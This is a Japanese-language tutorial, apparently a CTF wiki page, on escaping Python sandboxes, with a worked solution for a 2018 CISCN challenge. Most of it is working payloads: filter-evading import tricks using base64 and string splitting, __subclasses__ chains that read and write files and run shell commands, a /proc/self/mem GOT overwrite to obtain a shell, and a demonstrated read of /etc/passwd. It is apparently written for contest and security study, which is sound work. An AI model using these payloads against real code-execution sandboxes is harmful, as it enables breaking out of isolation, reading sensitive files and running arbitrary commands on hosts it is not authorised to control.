# Python サンドボックス
Python サンドボックスとは、何らかの方法で Python ターミナルを模擬し、ユーザーに Python を使わせる仕組みのことです。

## Python サンドボックス脱出(sandbox escape)の方法
一般に Python サンドボックス脱出とは、模擬された Python ターミナルを回避し、最終的にコマンド実行を実現することを指します。
### モジュールのインポート
Python の組み込み関数には、任意のコマンド実行に使えるものがいくつかあります。
```
os.system() os.popen()
commands.getstatusoutput() commands.getoutput()
commands.getstatus()
subprocess.call(command, shell=True) subprocess.Popen(command, shell=True)
pty.spawn()
```
Python でモジュールをインポートする方法は、通常 3 つあります(xxx はモジュール名)。

1. `import xxx`
2. `from xxx import *`
3. `__import__('xxx')`

上記のインポート方法で関連モジュールをインポートし、上記の関数を使ってコマンドを実行できます。
このほか、**パスを指定してモジュールを読み込む**こともできます。
たとえば Linux 上の Python の os モジュールは通常 `/usr/lib/python2.7/os.py` にあります。パスがわかっていれば、次の操作でモジュールをインポートし、そのまま関連する関数を使えます。
```py
>>> import sys
>>> sys.modules['os']='/usr/lib/python2.7/os.py'
>>> import os
>>>
```
**そのほかの危険な関数の例**
たとえば、ファイルを実行する **execfile** です。
```py
>>> execfile('/usr/lib/python2.7/os.py')
>>> system('cat /etc/passwd')
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
>>> getcwd()
'/usr/lib/python2.7'
```
**timeit**
```py
import timeit
timeit.timeit("__import__('os').system('dir')",number=1)
```

**exec と eval は定番です**
```py
eval('__import__("os").system("dir")')

```
**platform**

```py
import platform
print platform.popen('dir').read()
```

ただし、通常の Python サンドボックスは、os などの一部のモジュールをブラックリスト方式で禁止するか、ホワイトリスト方式でサンドボックスが提供するモジュールだけを使わせることで、ユーザーの危険な操作を防ぎます。そのうえでサンドボックスをさらに脱出する方法が、ここでの主な研究対象です。

### Python の組み込み関数
モジュールをインポートできない場合や、インポートしたいモジュールが禁止されている場合は、Python 自体の組み込み関数(通常は明示的にインポートしなくても、Python があらかじめインポートしている関数)に頼るしかありません。組み込み関数の一覧は `dir __builtin__` で取得できます。
```python
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']
```
Python では、インポートせずに直接使える組み込み関数を **builtin** 関数と呼び、**__builtin__** というモジュールとともに環境へ自動的に読み込まれます。では、モジュールはどのようにインポートすればよいでしょうか。**__dict__** を使えば、目的のモジュールを取り込めます。**__dict__** は、モジュール/クラス/オブジェクトが持つすべての属性と関数を列挙します。これはサンドボックス脱出で役に立ち、その中に隠れているものを見つけられます。
**__dict__** で何ができるのでしょうか。
モジュールオブジェクトには、辞書オブジェクトで実装された名前空間があり、属性の参照はこの辞書の検索に変換されます。たとえば m.x は m.dict["x"] と等価です。

回避の例:
まず base64 で文字列の平文検出を回避します。
```python
>>> import base64
>>> base64.b64encode('__import__')
'X19pbXBvcnRfXw=='
>>> base64.b64encode('os')
'b3M='
```
次に **__dict__** 経由で参照します。
```py
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64'))
```

*一部の組み込み関数が __builtins__ から削除されている場合は、reload(__builtins__) で再読み込みすれば、完全な __builtins__ を取得できます。*
### オブジェクトの生成と参照
Python の object クラスには多くの基本的な関数が含まれており、呼び出したいときは、オブジェクトを生成して参照することでも利用できます。

よく使われる方法は次の 2 つです。
```bash
().__class__.__bases__[0]
''.__class__.__mro__[2]
```
![](http://oayoilchh.bkt.clouddn.com/18-5-3/14928461.jpg)
たとえば、次のようにして
`print ().__class__.__bases__[0].__subclasses__()[40]("/etc/services").read()` でファイルを読み取れます。

**よく使われる payload**
```py
#ファイルを読む
().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()

#ファイルを書く
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

#任意のコマンドを実行する
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )
```

### 間接参照
問題によっては、たとえば 2018 年の国内決勝(国赛)の Python サンドボックス問題のように、import 自体が機能を削られていることがあります。しかし Python では、ネイティブの **__import__** が参照されている箇所が存在するため、関連するオブジェクトへの参照を見つけられれば、必要なものをさらに取得できます。具体的には、後述のデモで説明します。

### write による GOT の書き換え
実際には、**/proc/self/mem** を使ったメモリ操作の方法です。
**/proc/self/mem** はメモリイメージであり、これを通じて、実行コードを含むプロセスのすべてのメモリを読み書きできます。Python の **system** などの関数のオフセットを取得できれば、GOT を上書きして shell を取得できます。
```py
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))
```
1 つ目のアドレスは system のオフセット、2 つ目は fopen のオフセットです。関連情報は **objdump** で取得できます。
![](http://oayoilchh.bkt.clouddn.com/18-5-3/25123674.jpg)

## 例
2018 ciscn(全国大学生情報セキュリティコンテスト)の Python サンドボックス脱出です。
`print ().__class__.__bases__[0].__subclasses__()[40]("/home/ctf/sandbox.py").read()` で問題のソースコードを取得し、さらに分析できます。以下に 3 通りの脱出方法を示します。
### オブジェクトを生成し、Python の文字列操作の特性を利用する
```py
x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s /home/ctf')
x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ca'+'t /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb')
```
### GOT をハイジャックして shell を取得する
```py
(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('l'+'s /home/ctf/'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))


(lambda r,w:r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40]('c'+'at /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'))(().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem','r'),().__class__.__bases__[0].__subclasses__()[40]('/proc/self/mem', 'w', 0))

```
### __import__ への間接参照を探す
dir を繰り返し実行するうちに、__closure__ というオブジェクトが引数を保持しており、ネイティブの __import__ を参照できることがわかります。
```py

print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('l'+'s home') 
```
## 参考資料
https://xz.aliyun.com/t/52#toc-10 
https://blog.csdn.net/qq_35078631/article/details/78504415 
https://www.anquanke.com/post/id/85571 
http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01
